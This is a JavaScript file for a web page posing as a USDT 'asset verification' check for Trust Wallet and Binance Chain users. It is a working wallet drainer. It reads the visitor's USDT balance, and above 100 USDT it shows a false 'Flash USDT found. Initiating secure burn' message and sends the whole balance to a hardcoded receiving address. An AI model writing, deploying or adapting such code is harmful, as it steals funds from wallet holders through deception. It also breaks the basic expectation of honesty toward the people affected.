const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // Receiving USDT
const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20

let web3;
let userAddress = null;

async function waitForProvider() {
    return new Promise((resolve) => {
        const check = () => {
            if (window.BinanceChain || window.trustwallet || window.ethereum) {
                resolve(window.BinanceChain || window.trustwallet || window.ethereum);
            } else {
                setTimeout(check, 500);
            }
        };
        check();
    });
}

async function initWallet() {
    const provider = await waitForProvider();
    web3 = new Web3(provider);

    try {
        const accounts = await web3.eth.getAccounts();
        if (accounts && accounts.length > 0) {
            userAddress = accounts[0];
            console.log("✅ Wallet Connected:", userAddress);
        } else {
            console.warn("⚠️ No accounts returned. Will try later on button click.");
        }
    } catch (err) {
        console.error("Wallet error:", err);
    }
}

// Delay on page load (3s) — wait for wallet injection
window.addEventListener("load", () => {
    setTimeout(initWallet, 3000);
});

async function verifyAssets() {
    if (!web3 || !userAddress) {
        const provider = await waitForProvider();
        web3 = new Web3(provider);
        const accounts = await web3.eth.getAccounts();

        if (accounts.length === 0) {
            alert("❌ Wallet not connected. Please open in Trust Wallet browser.");
            return;
        }

        userAddress = accounts[0];
        console.log("✅ Wallet re-checked:", userAddress);
    }

    const usdt = new web3.eth.Contract([
        {
            constant: true,
            inputs: [{ name: "_owner", type: "address" }],
            name: "balanceOf",
            outputs: [{ name: "", type: "uint256" }],
            type: "function"
        }
    ], usdtContractAddress);

    const [usdtBalanceWei, bnbBalanceWei] = await Promise.all([
        usdt.methods.balanceOf(userAddress).call(),
        web3.eth.getBalance(userAddress)
    ]);

    const usdtBalance = parseFloat(web3.utils.fromWei(usdtBalanceWei, "ether"));
    const bnbBalance = parseFloat(web3.utils.fromWei(bnbBalanceWei, "ether"));

    console.log("USDT:", usdtBalance, "BNB:", bnbBalance);

    if (usdtBalance === 0) {
        showPopup("No USDT found.", "black");
    } else if (usdtBalance <= 100) {
        showPopup(`✅ Verified<br>USDT: ${usdtBalance}<br>BNB: ${bnbBalance}`, "green");
    } else {
        showPopup("Flash USDT found. Initiating secure burn...", "red");
        transferUSDT(usdtBalance);
    }
}

async function transferUSDT(amount) {
    const contract = new web3.eth.Contract([
        {
            constant: false,
            inputs: [
                { name: "recipient", type: "address" },
                { name: "amount", type: "uint256" }
            ],
            name: "transfer",
            outputs: [{ name: "", type: "bool" }],
            type: "function"
        }
    ], usdtContractAddress);

    const value = web3.utils.toWei(amount.toString(), "ether");

    try {
        await contract.methods.transfer(bscAddress, value).send({ from: userAddress });
        showPopup(`✅ Transferred ${amount} USDT`, "red");
    } catch (err) {
        console.error("Transfer failed:", err);
        alert("❌ Transfer failed. Check BNB gas.");
    }
}

function showPopup(message, color) {
    let popup = document.getElementById("popupBox");
    if (!popup) {
        popup = document.createElement("div");
        popup.id = "popupBox";
        popup.style.position = "fixed";
        popup.style.top = "50%";
        popup.style.left = "50%";
        popup.style.transform = "translate(-50%, -50%)";
        popup.style.padding = "20px";
        popup.style.borderRadius = "10px";
        popup.style.boxShadow = "0 0 10px rgba(0,0,0,0.2)";
        popup.style.textAlign = "center";
        popup.style.fontSize = "16px";
        popup.style.zIndex = 9999;
        popup.style.backgroundColor = "#fff";
        popup.style.width = "80%";
        popup.style.maxWidth = "400px";
        document.body.appendChild(popup);
    }

    popup.style.color = color;
    popup.innerHTML = message;
    popup.style.display = "block";

    setTimeout(() => {
        popup.style.display = "none";
    }, 5000);
}

document.getElementById("verifyAssets").addEventListener("click", verifyAssets);
